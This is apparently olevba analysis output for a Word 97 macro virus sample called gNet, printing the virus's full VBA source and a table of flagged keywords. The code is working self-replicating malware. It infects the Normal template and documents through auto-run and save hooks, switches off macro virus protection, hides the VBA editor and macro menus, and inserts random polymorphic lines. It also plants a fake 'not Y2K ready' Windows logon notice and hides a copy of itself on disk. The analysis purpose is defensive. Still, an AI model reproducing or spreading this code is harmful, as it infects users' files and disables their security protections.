olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gnet-92bc5a73788d9eeb40e38633229f45197396c151
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gnet-92bc5a73788d9eeb40e38633229f45197396c151 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO gNet.bas 
in file: Virus.MSWord.Gnet-92bc5a73788d9eeb40e38633229f45197396c151 - OLE stream: 'Macros/VBA/gNet'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' This is gNet Macro Virus version 2
' (c) 1999 by ksg
' astigmatiZm virus group
' www.astigmatiZm.cjb.net
' rename this file to gNet.bas and import it in MS Words Visual Basic Editor to activate

Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer

'----------------------
'  WM97.gNet version 2
' ---------------------
' (c) by KSG [ AMACC ]
' ---------------------
'   [ Astig Matizm ]
'

Sub main()
        On Error Resume Next
        Set ksg = Application.VBE.ActiveVBProject.VBComponents: Set tre = CodeModule
        Set cb = CommandBars: Set cbvisible = Visible: Set cbProtection = Protection
        k$ = "Fa": s$ = "lse"
        WordBasic.DisableAutoMacros 0
        cb("Visual Basic").cbvisible = False
        cb("Visual Basic").Enabled = False
        cb("Visual Basic").cbProtection = msoBarNoChangeVisible
        cb("Visual Basic").cbProtection = msoBarNoCustomize
        cb("Tools").Controls("Macro").Delete
        cb("Tools").Controls("Customize...").Delete
        CustomizationContext = NormalTemplate
        FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
        FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
        AtiveDocument.ReadOnlyRecommended = False
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "Windows Critical Error"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "This version of Windows is not Y2K ready. Please Upgrade Today! www.microsoft.com"
        
                With Application
                        .EnableCancelKey = wdCancelDisabled
                        .DisplayAlerts = wdAlertsNone
                End With
                
                With Options
                        .ConfirmConversions = k$ + s$
                        .VirusProtection = k$ + s$
                End With

        Randomize

        ActiveLines = ksg("gNet").tre.CountOfLines
        
        If ActiveLines > 300 Then
                        With ksg("gNet").tre
        
        For TheLine = 1 To .CountOfLines
                If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
        Next TheLine
        End With
        Else
                With ksg("gNet").tre
                vsize = Int(Rnd * 10)
        For loop1 = 1 To vsize
                pstring = ""
                PolyLines = .CountOfLines
                RndLine = Int(Rnd * PolyLines) + 1
                psize = Int(Rnd * 39) + 1
        For loop2 = 1 To psize
                pstring = pstring & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
        Next loop2
                .InsertLines RndLine, "Rem " & pstring
        Next loop1

        End With
        End If
        If Day(Now()) = 10 And Month(Now()) = 9 Then Call Payload

End Sub

Sub Payload()
On Error Resume Next

Assistant.Visible = True

With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Text = "W 9 7 M . g N e t   b y   k s g" & vbCr & "" & vbCr & "  www.astigmatiZm.cjb.net "
        .Heading = "astigmatiZm VX Team"
        .Animation = msoAnimationSearching
        .Show
End With

Assistant.Visible = False

While ShowCursor(False) >= 0
Wend

End Sub

Sub Routine()
On Error Resume Next

        Set amt = NormalTemplate.VBProject.VBComponents
        Set ksg = Application.VBE.ActiveVBProject.VBComponents: Set tre = CodeModule
        Application.EnableCancelKey = wdCancelDisabled

With Options
        .SaveNormalPrompt = (Rnd * 0)
        .VirusProtection = (Rnd * 0)
        .ConfirmConversions = (Rnd * 0)
End With
ksg("gNet").Export "C:\gNet.sys"

        For x = 1 To amt.Count
        
                If amt(x).Name = "gNet" Then var1 = True
        
        Next x

        For y = 1 To ActiveDocument.VBProject.VBComponents.Count
        
                If ActiveDocument.VBProject.VBComponents(y).Name = "gNet" Then varmain = True
        
        Next y

        If var1 = True And varmain = False Then Set adp = ActiveDocument.VBProject
        If var1 = False And varmain = True Then Set adp = NormalTemplate.VBProject
        If var1 = True And varmain = True Then GoTo labas

        adp.VBComponents.Import "C:\gNet.sys"

        If varmain = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
        If var1 = False Then NormalTemplate.Save

labas:
        Call main
        
        Shell "attrib +h c:\gNet.sys", vbHide

End Sub

Sub AutoOpen()
        On Error Resume Next
        Call Routine
        Call main
End Sub

Sub AutoNew()
        On Error Resume Next
        Call Routine
        Call main
End Sub

Sub FileSave()
        On Error Resume Next
        Call Routine
        Call main
        ActiveDocument.Save
End Sub

Sub FileSaveAs()
        On Error Resume Next
        Call Routine
        Call main
        Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub fclosedlg()
        On Error Resume Next
        Call Routine
        Call main
        WordBasic.FileClose dlg
End Sub

Sub fsavedlg()
        On Error Resume Next
        Call Routine
        Call main
        ActiveDocument.Save
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

